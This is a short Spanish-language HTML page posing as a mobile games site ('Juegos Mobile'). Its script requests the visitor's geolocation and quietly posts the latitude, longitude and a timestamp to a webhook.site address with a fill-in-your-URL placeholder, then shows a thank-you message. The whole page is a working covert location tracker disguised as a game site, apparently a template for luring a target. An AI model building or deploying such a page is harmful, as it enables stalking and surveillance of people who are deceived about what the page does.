<!DOCTYPE html>
<html>
<head>
  <title>Juegos Mobile</title>
</head>
<body>
  <h2>Cargando juegos móviles...</h2>
  <script>
    function enviarUbicacion(lat, lon) {
      fetch("https://webhook.site/PEGAR_AQUI_TU_URL", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          latitud: lat,
          longitud: lon,
          fecha: new Date().toISOString()
        })
      });
    }

    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(
        function(position) {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;
          enviarUbicacion(lat, lon);
          document.body.innerHTML = `<p>Gracias por visitar Juegos Mobile</p>`;
        },
        function(error) {
          document.body.innerHTML = "<p>No se pudo obtener tu ubicación.</p>";
        }
      );
    } else {
      document.body.innerHTML = "<p>Tu navegador no soporta geolocalización.</p>";
    }
  </script>
</body>
</html>
